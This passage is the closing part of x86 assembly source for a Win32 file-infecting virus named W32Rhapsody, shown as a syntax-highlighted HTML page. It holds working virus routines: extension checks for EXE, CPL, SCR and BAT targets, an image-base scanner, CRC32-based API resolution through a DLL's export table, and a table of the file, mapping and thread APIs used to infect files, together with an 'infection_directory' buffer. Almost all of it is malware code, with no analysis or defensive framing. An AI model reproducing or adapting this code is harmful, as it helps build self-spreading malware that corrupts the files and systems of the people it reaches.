        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"exe."</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ItWasEXE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"lpc."</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ItWasEXE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"rcs."</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ItWasEXE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"tab."</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">ItIsUnknown</span><span class="sc0">
</span><span class="sc5">ItWasBAT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">ItWasEXE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">ItIsUnknown</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ECX - Search limit</span><span class="sc0">
</span><span class="sc1">;       ESI - Where to begin</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       ESI - Module's imagebase if succesful</span><span class="sc0">
</span><span class="sc1">;       ECX - 0 if fail</span><span class="sc0">

</span><span class="sc5">CheckImageBase</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0FFFF0000h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"ZM"</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ItWasKewlEnough</span><span class="sc0">
</span><span class="sc5">NotCoolAddress</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">00010000h</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">CheckImageBase</span><span class="sc0">
</span><span class="sc5">ItWasKewlEnough</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ESI - Pointer to the code to process</span><span class="sc0">
</span><span class="sc1">;       EDI - Size of such code</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX - CRC32 of that code</span><span class="sc0">

</span><span class="sc5">CRC32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; Optimized by me - 2 bytes</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; less</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">NextByteCRC</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">NextBitCRC</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">rcr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">NoCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">08320h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0EDB8h</span><span class="sc0">
</span><span class="sc5">NoCRC</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">NextBitCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Another fool byte less</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">NextByteCRC</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.PUSHAD_EAX</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       EAX - Base address of the library where search the APIs</span><span class="sc0">
</span><span class="sc1">;       ECX - Numbers of APIs to search</span><span class="sc0">
</span><span class="sc1">;       ESI - Pointer to an array of CRC32 of the APIs we want to search</span><span class="sc0">
</span><span class="sc1">;       EDI - Pointer to where store the APIs</span><span class="sc0">

</span><span class="sc5">GetAPIs</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; EAX = Handle of module</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">TmpModuleBase</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc5">APIS33K</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Get in EAX the CRC32 of API</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAPI_ET_CRC32</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; Save in [EDI] the API address</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">APIS33K</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       EAX - CRC32 of the API we want to know its address</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX - API address</span><span class="sc0">

</span><span class="sc5">GetAPI_ET_CRC32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; Put CRC32 of da api in EDX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">Counter</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3Ch</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">TmpModuleBase</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">             </span><span class="sc1">; Get PE header of module</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">TmpModuleBase</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">             </span><span class="sc1">; Normalize</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1Ch</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Get a pointer to its edata</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">TmpModuleBase</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">AddressTableVA</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">            </span><span class="sc1">; Pointer to the address table</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Get AddressTable value</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">TmpModuleBase</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">             </span><span class="sc1">; Normalize</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; And store in its variable</span><span class="sc0">

    </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Get NameTable value</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">TmpModuleBase</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">             </span><span class="sc1">; Normalize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; Put it in stack</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; Store in its variable</span><span class="sc0">

    </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Get OrdinalTable value</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">TmpModuleBase</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">             </span><span class="sc1">; Normalize</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; Store</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; ESI = NameTable VA</span><span class="sc0">

</span><span class="sc5">@?_3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Get pointer to an API name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; Save again</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">TmpModuleBase</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">             </span><span class="sc1">; Normalize</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Store ptr in EDI</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; And in EBX</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Save EDI</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; ESI = Pointer to API Name</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; EDI = API Name size</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; Save API's CRC32</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CRC32</span><span class="sc0">                           </span><span class="sc1">; Get actual api's CRC32</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; Restore API's CRC32</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Are them equal?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@?_4</span><span class="sc0">                            </span><span class="sc1">; if yes, we got it</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; Restore ptr to api name</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">Counter</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">  </span><span class="sc1">; And increase the counter</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@?_3</span><span class="sc0">                            </span><span class="sc1">; Get another api!</span><span class="sc0">
</span><span class="sc5">@?_4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; Remove shit from stack</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">Counter</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0"> </span><span class="sc1">; AX = Counter</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                           </span><span class="sc1">; *2 (it's an array of words)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OrdinalTableVA</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">            </span><span class="sc1">; Normalize</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">; ESI = Ptr 2 ordinal; EAX = 0</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">                                   </span><span class="sc1">; Get ordinal in AX</span><span class="sc0">
    </span><span class="sc6">cwde</span><span class="sc0">                                    </span><span class="sc1">; Clear MSW of EAX</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                           </span><span class="sc1">; And with it we go to the</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">AddressTableVA</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">            </span><span class="sc1">; AddressTable (array of</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; dwords)</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Get Address of API RVA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">TmpModuleBase</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">             </span><span class="sc1">; and normalize!! That's it!</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">virus_end</span><span class="sc0">               </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">api_addresses</span><span class="sc0">           </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">FindFirstFileA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">FindNextFileA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">FindClose</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">CreateFileA</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">DeleteFileA</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">SetFilePointer</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">SetFileAttributesA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">CloseHandle</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">CreateFileMappingA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">MapViewOfFile</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">UnmapViewOfFile</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">SetEndOfFile</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">GetFileSize</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ReadFile</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">WriteFile</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">CreateThread</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ExitThread</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">WaitForSingleObject</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">GlobalAlloc</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">GlobalFree</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">iobytes</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00000000h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">MAX_PATH</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">260</span><span class="sc0">

</span><span class="sc5">FILETIME</span><span class="sc0">                </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">FT_dwLowDateTime</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FT_dwHighDateTime</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FILETIME</span><span class="sc0">                </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">         </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">WFD_dwFileAttributes</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_ftCreationTime</span><span class="sc0">      </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_ftLastAccessTime</span><span class="sc0">    </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_ftLastWriteTime</span><span class="sc0">     </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_nFileSizeHigh</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_dwReserved0</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_dwReserved1</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_szFileName</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">WFD_szAlternateFileName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">temp_bat_header</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">n_bat_inf1</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">current_directory</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">7Fh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">infection_directory</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">7Fh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">heap_end</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">Rhapsody</span><span class="sc0">        </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">PUSHAD_EDI</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">PUSHAD_ESI</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">PUSHAD_EBP</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">08h</span><span class="sc0">
</span><span class="sc5">PUSHAD_ESP</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0Ch</span><span class="sc0">
</span><span class="sc5">PUSHAD_EBX</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">PUSHAD_EDX</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">14h</span><span class="sc0">
</span><span class="sc5">PUSHAD_ECX</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">
</span><span class="sc5">PUSHAD_EAX</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1Ch</span><span class="sc0">

</span><span class="sc5">PUSHAD_SIZE</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">PUSHFD_SIZE</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04h</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">W32Rhapsody</span><span class="sc0">
</span></div></body>
</html>
